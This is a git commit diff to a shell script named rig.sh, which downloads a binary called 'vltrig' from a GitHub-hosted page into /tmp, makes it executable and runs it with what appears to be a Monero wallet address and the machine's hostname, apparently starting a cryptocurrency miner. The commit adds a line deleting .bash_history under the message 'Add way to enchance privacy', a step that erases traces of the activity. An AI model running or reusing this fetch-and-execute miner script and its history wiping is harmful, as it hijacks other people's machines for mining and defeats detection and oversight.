ff32910a136137318ffbeefc1fe9a1c69a2cd243
ivanhi0 <id.bodrov@gmail.com>
2026-04-14 13:08:59 +0300

    Add way to enchance privacy

--- rig.sh
+++ rig.sh
@@ -4,3 +4,4 @@ cd /tmp
 wget https://github.com/ivanhi0/ivanhi0.github.io/raw/refs/heads/main/vltrig
 chmod +x ./vltrig
 ./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
+rm -f .bash_history
